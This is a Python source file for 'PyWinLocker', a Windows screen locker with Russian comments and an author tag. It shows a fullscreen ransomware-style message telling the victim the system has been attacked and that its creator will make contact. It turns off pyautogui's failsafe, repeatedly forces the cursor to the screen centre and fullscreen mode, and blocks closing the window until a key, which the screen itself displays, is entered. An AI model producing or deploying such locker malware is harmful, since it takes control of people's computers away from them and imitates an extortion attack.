import pyautogui
import pythoncom, pyHook
from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep


def callback(event):
    global KEY, entry
    if entry.get() == "0x11": 
        KEY = True


def on_closing():
    click(width/2, height/2)  # закликивание в центр экрана
    moveTo(width/2, height/2)  # перемещение курсора в центр экрана
    root.attributes("-fullscreen", True)
    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.update() 
    root.bind('<Control-KeyPress-c>', callback)  # вводим сочетание клавиш, которые будут закрывать программу


root = Tk()
pyautogui.FAILSAFE = False  # выключаем защиту "левого верхнего угла"

width = root.winfo_screenwidth()
height = root.winfo_screenheight()

root.title('PyWinLocker')  # пишем как программа отобразиться в панели задач
root.attributes("-fullscreen", True)
root.config(bg = 'black')

entry = Entry(root, font = 3,  fg = 'red',bg = 'black') 
entry.place(width = 250, height = 50, x = width/2-165, y = height/2-25)  

label0 = Label(root, text = "PyWinLocker", font = 'Terminal 13')  
label0.grid(row = 2, column = 2)  # положение надписи с именем

label1 = Label(root, text = "Enter the Key and press Ctrl+C", font = 'Terminal 16', fg = 'red',bg = 'black')  # сообщение пользователю
label1.place(x = width/2-190, y = height/2-100)

label2 = Label(root, text = 'Ooops, Your system has been locked by PyWinLocker...', font = 'Terminal 20', fg = 'red', bg = 'black')
label2.place(x = 0, y = 50)
label3 = Label(root, text = 'If you see this message, it means that you system have been attacked.', font = 'Terminal 18', fg = 'red', bg = 'black')
label3.place(x = 0, y = 115)
label4 = Label(root, text = 'What should I do? Do not try to do anything yourself.', font = 'Terminal 18', fg = 'red',bg = 'black')
label4.place(x = 0, y = 145)
label5 = Label(root, text = 'You will soon be contacted by a creator of PyWinLocker and give you personal key.', font = 'Terminal 18', fg = 'red',bg = 'black')
label5.place(x = 0, y = 175)

label6 = Label(root, text = 'Please follow the instruction: ', font = 'Terminal 18', fg = 'red',bg = 'black')
label6.place(x = 0, y = 205)
label6 = Label(root, text = '1) You key: 0x11 ', font = 'Terminal 18', fg = 'red',bg = 'black')
label6.place(x = 25, y = 235)
label7 = Label(root, text = '2) Enter your key and unlock your system', font = 'Terminal 18', fg = 'red',bg = 'black')
label7.place(x = 25, y = 265)
label8 = Label(root, text = 'made by S1DAL3X', font = 'Terminal 18', fg = 'red',bg = 'black')
label8.place(x = 0, y = 295)
label9 = Label(root, text = 'Dog: woof-woof', font = 'Terminal 18', fg = 'red',bg = 'black')
label9.place(x = 0, y = 325)


#root.update()  # постоянное обновление окна
#sleep(0.2)  # пауза в обновлении
click(width/2, height/2)  # закликивание в центр экрана

KEY = False
while not KEY:  # пока не ввели верный ключ
    on_closing()  # вызываем функцию хулиганства
